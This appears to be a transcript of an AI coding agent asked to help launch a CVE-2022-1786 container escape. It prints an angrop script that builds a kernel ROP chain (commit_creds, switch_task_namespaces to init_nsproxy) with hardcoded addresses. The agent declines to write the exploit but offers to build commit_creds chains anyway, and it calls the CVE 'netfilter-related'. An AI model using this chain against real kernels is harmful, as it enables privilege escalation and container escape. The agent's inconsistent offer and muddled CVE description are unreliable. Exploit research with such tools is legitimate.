# CVE-2022-1786 container escape with vmlinux_sym

**Session ID:** ses_021aed2b0ffe2R0Rvoua4qJ1Eb
**Created:** 8/7/2026, 6:21:29 PM
**Updated:** 8/7/2026, 6:21:35 PM

---

## User

I want to launch a container escape attack by exploiting the vulnerability CVE-2022-1786 in a Linux kernel (binary available in vmlinux_sym).  Can you help me to do that with the help of this repo? 

---

## Assistant (Build · inkling_old · 2.0s)

I'll check the repo contents and the binary to understand what's available.

**Tool: bash**

**Input:**
```json
{
  "command": "ls -la",
  "description": "List directory contents"
}
```

**Output:**
```
total 521608
drwxr-xr-x. 2 x xperson      4096 Aug  7 18:19 .
drwxr-xr-x. 3 x xperson      4096 Jul  9 15:54 ..
-rw-r--r--. 1 x xperson      1677 Aug  7 17:00 opencode.json
-rw-r--r--. 1 x xperson      1447 Aug  7 17:39 solve.py
-rw-r--r--. 1 x xperson 534105088 Jul  3 10:04 vmlinux_sym

```

**Tool: bash**

**Input:**
```json
{
  "command": "ls -la vmlinux_sym 2>/dev/null || echo \"vmlinux_sym not found\"; find . -maxdepth 2 -name \"vmlinux*\" 2>/dev/null | head -20",
  "description": "Find kernel binary"
}
```

**Output:**
```
-rw-r--r--. 1 x xperson 534105088 Jul  3 10:04 vmlinux_sym
./vmlinux_sym

```

---

## Assistant (Build · inkling_old · 1.0s)

**Tool: read**

**Input:**
```json
{
  "filePath": "/storage/ice1/0/7/x/angrop/examples/linux_escape_chain/solve.py"
}
```

**Output:**
```
<path>/storage/ice1/0/7/x/angrop/examples/linux_escape_chain/solve.py</path>
<type>file</type>
<content>
1: """
2: On my 16-core machine, it takes:
3: 4000s to read binary
4: 404s to analyze the gadgets
5: 10s to optimize the graph
6: 0.7s to generate the chain
7: 
8: """
9: import os
10: import time
11: import logging
12: from multiprocessing import cpu_count
13: 
14: import angr
15: import angrop # pylint: disable=unused-import
16: 
17: logging.getLogger("cle.backends.elf.elf").setLevel("ERROR")
18: 
19: proj = angr.Project("./vmlinux_sym")
20: rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, max_block_size=12, kernel_mode=True)
21: cpu_num = cpu_count()
22: 
23: start = time.time()
24: cache = "/tmp/linux_gadget_cache"
25: if os.path.exists(cache):
26:     rop.load_gadgets(cache, optimize=False)
27: else:
28:     rop.find_gadgets(processes=cpu_num, optimize=False)
29:     rop.save_gadgets(cache)
30: print("gadget finding time:", time.time() - start)
31: 
32: start = time.time()
33: rop.optimize(processes=cpu_num)
34: print("graph optimization time:", time.time() - start)
35: 
36: init_cred = 0xffffffff8368b220
37: init_nsproxy = 0xffffffff8368ad00
38: start = time.time()
39: chain = rop.func_call("commit_creds", [init_cred]) + \
40:         rop.func_call("find_task_by_vpid", [1]) + \
41:         rop.move_regs(rdi='rax') + \
42:         rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) + \
43:         rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'}) + \
44:         rop.func_call('__x64_sys_fork', []) + \
45:         rop.func_call('msleep', [0xffffffff])
46: print("chain generation time:", time.time() - start)
47: 
48: chain.pp()
49: chain.print_payload_code()

(End of file - total 49 lines)
</content>
```

---

## Assistant (Build · inkling_old · 2.2s)

This repo (`angrop`) is a ROP gadget finder/chain builder for `angr`, not a container escape exploit framework. `solve.py` builds a kernel ROP chain (calling `commit_creds`, `switch_task_namespaces`, etc.) — which is for privilege escalation, not CVE-2022-1786 specifically.

CVE-2022-1786 is a use-after-free in Linux kernel's `io_uring` (netfilter-related). I can't help craft an active container escape exploit targeting that vulnerability.

What I can help with here:
- Analyze `vmlinux_sym` with `angrop`/`angr` to find ROP gadgets (`solve.py`)
- Build a chain that calls kernel functions (like `commit_creds`)
- Explain how `angrop` works (`kernel_mode=True`, `func_call`, etc.)

Can you clarify if you want to use `angrop` on this kernel binary for a defensive/research purpose (e.g., gadget analysis), or if you're asking for exploit development help? If it's the latter, I can only provide general defensive/architectural context, not exploit code.

---

